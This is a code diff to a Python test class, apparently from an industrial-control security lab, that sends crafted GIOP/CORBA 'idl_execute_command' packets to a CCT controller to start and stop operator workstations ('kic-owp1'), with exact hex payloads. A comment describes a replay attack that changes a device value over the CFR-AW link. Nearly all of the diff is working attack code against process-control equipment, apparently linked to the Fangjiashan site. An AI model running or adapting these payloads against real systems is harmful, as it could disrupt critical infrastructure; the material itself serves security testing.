@@ -11,7 +11,9 @@ class TestFangJiaShan(object):
 
     # 在 test() 方法中调用不同的测试方法
     def test(self):
-        self.test_sas_start_owp5()
+        # self.test_sas_stop_owp1()
+        self.test_sas_start_owp1()
+        # self.test_sas_start_owp5()
         # self.test_sas_stop_owp5()
         # self.test_cfr_aw_165vl_change_value()
         # self.test_cfr_aw_190p0_start()
@@ -39,7 +41,9 @@ class TestFangJiaShan(object):
         # cct2:  192.168.69.102  12900  14010f00525354ced88b5f34c10c00030000000100000004000000
         # 与CCT2建立TCP连接
         skt = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-        skt.connect(('192.168.69.102', 12900))
+        ## 方家山的CCT的IP是192.168.69.102，使用端口12900。
+        ## TODO: 武汉研究所的CCT只有一台(master)，没有slave，是192.168.69.101，使用端口11900
+        skt.connect(('192.168.69.101', 11900))
 
         # 封装GIOP命令数据包
         pkt = GIOP(type='Request',
@@ -65,7 +69,7 @@ class TestFangJiaShan(object):
     # 功能：OWP5停止，测试主机连接到CCT，使用GIOP协议下发命令
     def test_sas_stop_owp5(self):
         skt = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-        skt.connect(('192.168.69.102', 12900))
+        skt.connect(('192.168.69.101', 11900))
 
         pkt = GIOP(type='Request',
                    RequestID=1,
@@ -82,10 +86,46 @@ class TestFangJiaShan(object):
         time.sleep(3)
         skt.close()
 
+    def test_sas_stop_owp1(self):
+        skt = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        skt.connect(('192.168.69.101', 11900))
+        pkt = GIOP(type='Request',
+                   RequestID=1,
+                   KeyAddress=h2b('14010f005253547f0c926117860b00030000000100000004000000'),
+                   RequestOperation='idl_execute_command',
+                   StubData=h2b('0300000034390065010000002b0000002461646163735f7066612f636f6d5f636d642f67656'
+                                'e6572616c5f73746f705f6d616e616765722e7368000001000000090000006b69632d6f7770'
+                                '31000000000200000000000000')
+                   )
+        skt.send(bytes(pkt))
+        print('Sleeping... 3s')
+        time.sleep(3)
+        skt.close()
+
+
+    def test_sas_start_owp1(self):
+        skt = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        skt.connect(('192.168.69.101', 11900))
+        pkt = GIOP(type='Request',
+                   RequestID=1,
+                   KeyAddress=h2b('14010f005253547f0c926117860b00030000000100000004000000'),
+                   RequestOperation='idl_execute_command',
+                   StubData=h2b('0300000034380065010000002e0000002461646163735f7066612f636f6d5f636d642f67656'
+                                'e6572616c5f737461727475705f6d616e616765722e736800000001000000090000006b6963'
+                                '2d6f777031000000000200000000000000'
+                                )
+                   )
+        skt.send(bytes(pkt))
+        print('Sleeping... 3s')
+        time.sleep(3)
+        skt.close()
+
+
     # 功能：修改GSS-165VL设备值，测试主机连接到AW，使用TCP负载下发命令
     # 说明：CFR-AW段的流量，做回放攻击时，可通过连接到AW的TCP连接下发命令，命令数据包形式即TCP直传的字符串负载
     def test_cfr_aw_165vl_change_value(self):
         skt_aw = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+
         skt_aw.connect(('192.168.1.1', 45678))
 
         # 负载第二行行尾处的最后一个参数（'59'），即表示将设备值修改为 59
@@ -169,3 +209,9 @@ class TestFangJiaShan(object):
         print('Sleeping... 1s')
         time.sleep(1)
         skt.close()
+
+if __name__ == '__main__':
+    def run():
+        # TestS5().test()
+        TestFangJiaShan().test()
+    run()
